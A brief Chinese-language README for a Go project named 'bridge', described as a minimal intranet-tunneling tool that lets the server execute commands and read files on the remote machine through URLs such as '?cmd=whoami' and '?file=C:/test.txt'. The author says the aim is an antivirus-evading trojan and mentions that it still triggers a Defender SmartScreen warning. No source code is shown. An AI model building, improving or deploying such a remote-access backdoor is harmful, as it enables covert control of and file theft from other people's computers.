# bridge
## 介绍
用Go写的最简单的内网穿透程序，穿透完成后，服务端可以进行命令执行与文件读取。
URL分别为：server-host:6602/?cmd=whoami & server-host:6602/?file=C:/test.txt" 

## 免杀
搞这个主要想做一个免杀的马子，现在的代码倒是不红标，但是会弹篮框：“Microsoft Defender SmartScreen阻止了无法识别的应用启动。”
